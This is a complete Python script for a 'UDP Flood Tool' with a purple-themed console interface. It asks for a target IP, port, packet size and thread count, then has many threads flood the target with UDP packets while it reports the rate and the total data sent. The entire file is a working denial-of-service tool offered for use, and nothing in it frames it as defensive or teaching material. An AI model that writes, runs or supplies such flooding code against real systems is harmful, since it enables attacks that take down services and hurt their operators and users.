from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint
from time import time, sleep
import colorama
from colorama import Fore, Style
import platform
import ctypes
import os

colorama.init()

def clear_screen():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def info(self):
        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"{Fore.MAGENTA}[{Fore.WHITE}+{Fore.MAGENTA}] {Fore.WHITE}Speed: {Fore.LIGHTMAGENTA_EX}{round(size)} Mb/s {Fore.WHITE}- Total: {Fore.LIGHTCYAN_EX}{round(self.total, 1)} Gb", end='\r')

            now2 = time()

            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

def print_header():
    clear_screen()
    if platform.system() == 'Windows':
        ctypes.windll.kernel32.SetConsoleTitleW("UDP Flood Tool - Purple Theme")
    
    print(f"\n{Fore.MAGENTA}╔{'═'*60}╗")
    print(f"{Fore.MAGENTA}║{Fore.LIGHTMAGENTA_EX}{' '*25}UDP FLOOD TOOL{' '*22}{Fore.MAGENTA}║")
    print(f"{Fore.MAGENTA}╚{'═'*60}╝\n")

def main():
    print_header()
    
    try:
        ip = input(f"{Fore.MAGENTA}[{Fore.WHITE}+{Fore.MAGENTA}] {Fore.WHITE}Target IP: {Fore.LIGHTMAGENTA_EX}")
        if not ip:
            print(f"{Fore.LIGHTRED_EX}[{Fore.WHITE}!{Fore.LIGHTRED_EX}] {Fore.WHITE}IP address required!")
            return
    except KeyboardInterrupt:
        print(f"\n{Fore.LIGHTRED_EX}[{Fore.WHITE}!{Fore.LIGHTRED_EX}] {Fore.WHITE}Exiting...")
        return

    try:
        port_input = input(f"{Fore.MAGENTA}[{Fore.WHITE}+{Fore.MAGENTA}] {Fore.WHITE}Port (Enter for random): {Fore.LIGHTMAGENTA_EX}")
        port = int(port_input) if port_input.strip() else 0
    except ValueError:
        print(f"{Fore.LIGHTRED_EX}[{Fore.WHITE}!{Fore.LIGHTRED_EX}] {Fore.WHITE}Invalid port! Using random ports.")
        port = 0

    try:
        force_input = input(f"{Fore.MAGENTA}[{Fore.WHITE}+{Fore.MAGENTA}] {Fore.WHITE}Packet size (Default 1250): {Fore.LIGHTMAGENTA_EX}")
        force = int(force_input) if force_input.strip() else 1250
    except ValueError:
        print(f"{Fore.LIGHTRED_EX}[{Fore.WHITE}!{Fore.LIGHTRED_EX}] {Fore.WHITE}Invalid size! Using default 1250.")
        force = 1250

    try:
        threads_input = input(f"{Fore.MAGENTA}[{Fore.WHITE}+{Fore.MAGENTA}] {Fore.WHITE}Threads (Default 35): {Fore.LIGHTMAGENTA_EX}")
        threads = int(threads_input) if threads_input.strip() else 35
    except ValueError:
        print(f"{Fore.LIGHTRED_EX}[{Fore.WHITE}!{Fore.LIGHTRED_EX}] {Fore.WHITE}Invalid threads! Using default 35.")
        threads = 35

    print(f"\n{Fore.MAGENTA}[{Fore.WHITE}*{Fore.MAGENTA}] {Fore.WHITE}Starting attack on {Fore.LIGHTCYAN_EX}{ip}{Fore.WHITE}:{Fore.LIGHTCYAN_EX}{port if port else 'RANDOM'}")
    print(f"{Fore.MAGENTA}[{Fore.WHITE}*{Fore.MAGENTA}] {Fore.WHITE}Packet size: {Fore.LIGHTMAGENTA_EX}{force} bytes")
    print(f"{Fore.MAGENTA}[{Fore.WHITE}*{Fore.MAGENTA}] {Fore.WHITE}Threads: {Fore.LIGHTMAGENTA_EX}{threads}")
    print(f"{Fore.MAGENTA}[{Fore.WHITE}*{Fore.MAGENTA}] {Fore.WHITE}Press CTRL+C or type 'stop' to end attack\n")
    
    try:
        brute = Brutalize(ip, port, force, threads)
        brute.flood()
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[{Fore.WHITE}!{Fore.LIGHTRED_EX}] {Fore.WHITE}Error starting attack: {e}")
        return

    try:
        while True:
            cmd = input(f"\n{Fore.MAGENTA}[{Fore.WHITE}>{Fore.MAGENTA}] {Fore.WHITE}Type 'stop' to end: {Fore.LIGHTMAGENTA_EX}").lower().strip()
            if cmd in ['stop', 'exit', 'quit', 'end']:
                brute.stop()
                print(f"\n{Fore.MAGENTA}[{Fore.WHITE}*{Fore.MAGENTA}] {Fore.WHITE}Attack stopped")
                print(f"{Fore.MAGENTA}[{Fore.WHITE}*{Fore.MAGENTA}] {Fore.WHITE}Total data sent: {Fore.LIGHTCYAN_EX}{round(brute.total, 1)} Gb")
                break
    except KeyboardInterrupt:
        brute.stop()
        print(f"\n{Fore.MAGENTA}[{Fore.WHITE}*{Fore.MAGENTA}] {Fore.WHITE}Attack stopped by user")
        print(f"{Fore.MAGENTA}[{Fore.WHITE}*{Fore.MAGENTA}] {Fore.WHITE}Total data sent: {Fore.LIGHTCYAN_EX}{round(brute.total, 1)} Gb")

if __name__ == '__main__':
    main()